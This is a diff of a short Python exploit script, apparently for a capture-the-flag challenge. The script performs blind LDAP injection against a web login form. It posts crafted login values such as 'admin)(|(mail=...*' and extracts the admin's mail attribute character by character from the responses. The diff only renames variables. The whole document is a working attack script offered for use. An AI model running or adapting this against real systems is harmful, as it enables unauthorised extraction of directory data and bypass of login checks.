@@ -1,32 +1,33 @@
+# python3 sploit.py <ip> <port> 
 import requests, string, sys
 
 HOST = sys.argv[1]
 PORT = sys.argv[2]
 URL = f"http://{HOST}:{PORT}/"
-ADMIN_USER_NAME = "admin"
+user = "admin"
 
-ALPHABET = string.ascii_letters + string.digits
+Array = string.ascii_letters + string.digits
 
 def main():
 	flag = ""
 
 	while True:
-		is_found = False
+		have = False
 
-		for c in ALPHABET:
+		for i in Array:
 			data = {
-				"login": f"{ADMIN_USER_NAME})(|(mail={flag}{c}*",
+				"login": f"{user})(|(mail={flag}{i}*",
 				"password": "1)"
 			}
-			r = requests.post(URL, data = data)
+			q = requests.post(URL, data = data)
 
-			if ADMIN_USER_NAME in r.text:
-				flag += c
-				is_found = True
+			if user in q.text:
+				flag += i
+				have = True
 				print(flag)
 				break
 
-		if not is_found:
+		if not have:
 			break
 
 if __name__ == '__main__':
